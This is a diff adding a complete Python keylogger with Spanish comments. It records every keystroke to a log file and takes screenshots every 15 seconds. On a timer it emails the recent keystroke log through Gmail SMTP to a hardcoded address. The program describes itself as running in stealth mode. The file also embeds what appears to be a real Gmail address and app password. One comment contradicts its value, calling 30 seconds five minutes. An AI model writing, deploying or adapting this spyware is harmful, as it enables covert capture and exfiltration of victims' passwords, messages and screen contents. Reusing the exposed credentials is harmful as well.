@@ -1,0 +1,141 @@
+import pynput
+from pynput.keyboard import Listener, Key
+import datetime
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+import threading
+import os
+import time
+import mss
+import sys
+
+# ==================== CONFIGURACIÓN ====================
+LOG_FILE = "keys.log"
+SCREENSHOT_INTERVAL = 15      # segundos entre capturas
+EMAIL_INTERVAL = 30          # 5 minutos
+EMAIL_ADDRESS = "milipiliantonia12@gmail.com"          # ← CAMBIA ESTO
+EMAIL_PASSWORD = "kago stik tmxt ewwk"     # ← Contraseña de aplicación de Gmail
+
+class AdvancedKeylogger:
+    def __init__(self):
+        self.log_file = LOG_FILE
+        self.screenshots_dir = "screenshots"
+        self.keys = []
+        self.email_interval = EMAIL_INTERVAL
+        self.screenshot_interval = SCREENSHOT_INTERVAL
+        self.last_email_time = time.time()
+        
+        # Crear carpeta de screenshots
+        os.makedirs(self.screenshots_dir, exist_ok=True)
+        
+        print(f" Keylogger Avanzado + Screenshots iniciado - {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+        print(f" Capturas cada {self.screenshot_interval} segundos")
+        print(f" Reportes por email cada {self.email_interval//60} minutos")
+        
+        # Crear archivo de log
+        if not os.path.exists(self.log_file):
+            with open(self.log_file, "w", encoding="utf-8") as f:
+                f.write(f"=== INICIO DE LOG - {datetime.datetime.now()} ===\n\n")
+
+    def write_to_log(self, content):
+        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        with open(self.log_file, "a", encoding="utf-8") as f:
+            f.write(f"[{timestamp}] {content}\n")
+
+    def process_key(self, key):
+        try:
+            if hasattr(key, 'char') and key.char is not None:
+                return key.char
+            else:
+                special = {
+                    Key.space: " [SPACE] ", Key.enter: " [ENTER]\n", Key.tab: " [TAB] ",
+                    Key.backspace: " [BACKSPACE] ", Key.esc: " [ESC] ", Key.shift: " [SHIFT] ",
+                    Key.ctrl: " [CTRL] ", Key.alt: " [ALT] ", Key.caps_lock: " [CAPS_LOCK] ",
+                    Key.cmd: " [WINDOWS] ",
+                }
+                return special.get(key, f" [{str(key).replace('Key.', '').upper()}] ")
+        except:
+            return f" [UNKNOWN] "
+
+    def on_press(self, key):
+        formatted = self.process_key(key)
+        self.keys.append(formatted)
+        self.write_to_log(formatted)
+        
+        # Envío periódico por email
+        if time.time() - self.last_email_time > self.email_interval:
+            threading.Thread(target=self.send_email_report, daemon=True).start()
+            self.last_email_time = time.time()
+
+    def take_screenshot(self):
+        """Toma captura de pantalla cada X segundos"""
+        try:
+            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+            filepath = os.path.join(self.screenshots_dir, f"screenshot_{timestamp}.png")
+            
+            with mss.mss() as sct:
+                screenshot = sct.shot(output=filepath)
+            print(f"📸 Captura guardada: {filepath}")
+        except Exception as e:
+            print(f" Error en screenshot: {e}")
+
+    def screenshot_worker(self):
+        """Hilo que toma capturas periódicas"""
+        while True:
+            self.take_screenshot()
+            time.sleep(self.screenshot_interval)
+
+    def send_email_report(self):
+        try:
+            with open(self.log_file, "r", encoding="utf-8") as f:
+                log_content = f.read()[-4000:]
+            
+            screenshot_count = len(os.listdir(self.screenshots_dir)) if os.path.exists(self.screenshots_dir) else 0
+
+            msg = MIMEMultipart()
+            msg['From'] = EMAIL_ADDRESS
+            msg['To'] = EMAIL_ADDRESS
+            msg['Subject'] = f" Keylogger Report + {screenshot_count} Screenshots - {datetime.datetime.now().strftime('%H:%M')}"
+
+            body = f"""
+            REPORTE KEYLOGGER AVANZADO
+            =================================
+            Hora: {datetime.datetime.now()}
+            Teclas capturadas: {len(self.keys)}
+            Capturas de pantalla tomadas: {screenshot_count}
+            
+            === ÚLTIMOS LOGS ===
+            {log_content}
+            """
+            msg.attach(MIMEText(body, 'plain'))
+
+            server = smtplib.SMTP('smtp.gmail.com', 587)
+            server.starttls()
+            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
+            server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, msg.as_string())
+            server.quit()
+            print("📧 Email enviado con éxito!")
+        except Exception as e:
+            print(f" Error email: {e}")
+
+    def run(self):
+        print(" Iniciando en modo sigiloso... (Ctrl + C para detener)")
+        
+        # Hilo de screenshots
+        screenshot_thread = threading.Thread(target=self.screenshot_worker, daemon=True)
+        screenshot_thread.start()
+        
+        # Iniciar keylogger
+        with Listener(on_press=self.on_press) as listener:
+            listener.join()
+
+# ==================== EJECUCIÓN ====================
+if __name__ == "__main__":
+    try:
+        keylogger = AdvancedKeylogger()
+        keylogger.run()
+    except KeyboardInterrupt:
+        print("\n Keylogger detenido por el usuario.")
+    except Exception as e:
+        print(f" Error: {e}")
